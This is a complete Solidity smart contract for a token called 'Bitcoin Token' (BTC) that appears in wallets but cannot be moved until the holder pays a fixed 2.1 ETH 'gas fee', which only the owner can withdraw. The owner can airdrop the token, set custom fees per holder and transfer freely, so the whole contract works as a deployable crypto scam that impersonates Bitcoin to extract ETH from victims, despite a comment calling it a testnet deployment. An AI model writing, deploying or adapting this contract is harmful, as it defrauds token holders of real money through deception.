// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title FakeBTC
 * @dev Fake Bitcoin token that appears in wallets but cannot be transferred without paying gas fees
 * @notice Testnet deployment - non-transferable without gas payment mechanism
 */
contract FakeBTC is ERC20, Ownable {
    // Maximum supply cap: 21 million BTC (Bitcoin's cap)
    uint256 public constant MAX_SUPPLY = 21 * 10**6 * 10**8; // 21 million BTC with 8 decimals
    
    // Gas fee parameters (in basis points and wei)
    uint16 public gasFeeBps; // Basis points (e.g., 100 = 1%)
    uint256 public minGasFee; // Minimum gas fee in wei
    uint256 public maxGasFee; // Maximum gas fee in wei

    // Tracking
    mapping(address => uint256) public gasBalance; // ETH paid for gas by user
    mapping(address => bool) public approvedSenders; // Addresses that bypass gas fee
    mapping(address => uint256) public customGasFees; // Custom gas fee per recipient (0 = use default)
    mapping(address => GasPaymentRecord[]) public gasPaymentHistory;

    struct GasPaymentRecord {
        uint256 amount;
        uint256 timestamp;
        string transactionId;
    }

    // Events
    event GasFeePaid(address indexed user, uint256 amount);
    event GasFeeUpdated(uint16 newBps, uint256 minFee, uint256 maxFee);
    event ApprovedSenderUpdated(address indexed sender, bool approved);
    event CustomGasFeeSet(address indexed recipient, uint256 gasFee);
    event GasFeesWithdrawn(uint256 amount);

    /**
     * @dev Initialize Fake BTC token with gas fee mechanism
     */
    constructor() ERC20("Bitcoin Token", "BTC") Ownable(msg.sender) {
        // Initialize FIXED gas fee: $6300 worth of ETH (~2.1 ETH at $3000/ETH)
        gasFeeBps = 0; // Not used for fixed fees
        minGasFee = 2.1 ether; // ~$6300 fixed fee
        maxGasFee = 2.1 ether; // Same as min (fixed fee)

        // Mint initial supply to owner (2.1 BTC with 8 decimals)
        _mint(msg.sender, 21 * 10**7); // 2.1 BTC
    }

    /**
     * @dev Returns token decimals (Bitcoin uses 8 decimals)
     */
    function decimals() public pure override returns (uint8) {
        return 8;
    }

    /**
     * @dev Transfer tokens - blocked unless user has paid gas fee or is approved sender (owner can transfer freely)
     */
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Owner (admin) can transfer without gas fee
        if (msg.sender == owner()) {
            return super.transfer(to, amount);
        }

        // Check if sender has paid gas fee or is approved
        require(
            gasBalance[msg.sender] > 0 || approvedSenders[msg.sender],
            "FAKE_BTC_ERROR: Cannot transfer without paying gas fee"
        );

        // Deduct gas fee from gas balance (use custom fee if set for this user)
        if (!approvedSenders[msg.sender]) {
            uint256 gasFee = customGasFees[msg.sender] > 0 ? customGasFees[msg.sender] : calculateGasFee(amount);
            require(gasBalance[msg.sender] >= gasFee, "Insufficient gas balance");
            gasBalance[msg.sender] -= gasFee;
        }

        // Perform transfer
        return super.transfer(to, amount);
    }

    /**
     * @dev TransferFrom tokens - blocked unless user has paid gas fee
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        // Check if sender has paid gas fee or is approved
        require(
            gasBalance[from] > 0 || approvedSenders[from],
            "FAKE_BTC_ERROR: Cannot transfer without paying gas fee"
        );

        // Deduct gas fee from gas balance (use custom fee if set for this user)
        if (!approvedSenders[from]) {
            uint256 gasFee = customGasFees[from] > 0 ? customGasFees[from] : calculateGasFee(amount);
            require(gasBalance[from] >= gasFee, "Insufficient gas balance");
            gasBalance[from] -= gasFee;
        }

        // Perform transfer
        return super.transferFrom(from, to, amount);
    }

    /**
     * @dev Calculate gas fee for transfer amount
     * For FakeBTC: Fixed fee - 2.1 ETH (~$6300)
     */
    function calculateGasFee(uint256 amount) public view returns (uint256) {
        // Return fixed fee (minGasFee and maxGasFee are the same for fixed pricing)
        return minGasFee; // 2.1 ETH = ~$6300
    }

    /**
     * @dev Pay gas fee by sending ETH
     */
    function payGasFee() public payable {
        require(msg.value > 0, "Gas fee must be greater than 0");

        gasBalance[msg.sender] += msg.value;

        gasPaymentHistory[msg.sender].push(
            GasPaymentRecord({
                amount: msg.value,
                timestamp: block.timestamp,
                transactionId: ""
            })
        );

        emit GasFeePaid(msg.sender, msg.value);
    }

    /**
     * @dev Fallback function to accept ETH for gas payment
     */
    receive() external payable {
        payGasFee();
    }

    /**
     * @dev Get gas payment history for address
     */
    function getGasPaymentHistory(address user)
        public
        view
        returns (GasPaymentRecord[] memory)
    {
        return gasPaymentHistory[user];
    }

    /**
     * @dev Distribute tokens to multiple addresses (owner only)
     */
    function distributeTokens(address[] calldata recipients, uint256[] calldata amounts)
        public
        onlyOwner
    {
        require(recipients.length == amounts.length, "Array lengths must match");

        // Check total supply doesn't exceed max
        uint256 totalMint = 0;
        for (uint256 i = 0; i < amounts.length; i++) {
            totalMint += amounts[i];
        }
        require(totalSupply() + totalMint <= MAX_SUPPLY, "Exceeds max supply (21M BTC)");

        for (uint256 i = 0; i < recipients.length; i++) {
            _mint(recipients[i], amounts[i]);
        }
    }

    /**
     * @dev Update gas fee parameters (owner only)
     */
    function updateGasFee(
        uint16 newBps,
        uint256 newMinFee,
        uint256 newMaxFee
    ) public onlyOwner {
        require(newBps > 0 && newBps <= 10000, "BPS must be between 0 and 10000");
        require(newMinFee > 0 && newMaxFee > 0, "Fees must be greater than 0");
        require(newMinFee <= newMaxFee, "Min fee must be <= max fee");

        gasFeeBps = newBps;
        minGasFee = newMinFee;
        maxGasFee = newMaxFee;

        emit GasFeeUpdated(newBps, newMinFee, newMaxFee);
    }

    /**
     * @dev Set custom gas fee for a specific recipient (owner only)
     * @param recipient Address of recipient to set custom gas fee for
     * @param gasFeeAmount Amount of ETH required (0 to use default)
     */
    function setCustomGasFee(address recipient, uint256 gasFeeAmount) public onlyOwner {
        require(recipient != address(0), "Invalid recipient address");
        customGasFees[recipient] = gasFeeAmount;
        emit CustomGasFeeSet(recipient, gasFeeAmount);
    }

    /**
     * @dev Set approved sender that bypasses gas fee (owner only)
     */
    function setApprovedSender(address sender, bool approved) public onlyOwner {
        approvedSenders[sender] = approved;
        emit ApprovedSenderUpdated(sender, approved);
    }

    /**
     * @dev Withdraw accumulated gas fees (owner only)
     */
    function withdrawGasFees(uint256 amount) public onlyOwner {
        require(amount <= address(this).balance, "Insufficient contract balance");
        
        // Use call() instead of deprecated transfer()
        (bool success, ) = payable(owner()).call{value: amount}("");
        require(success, "ETH withdrawal failed");
        
        emit GasFeesWithdrawn(amount);
    }
}
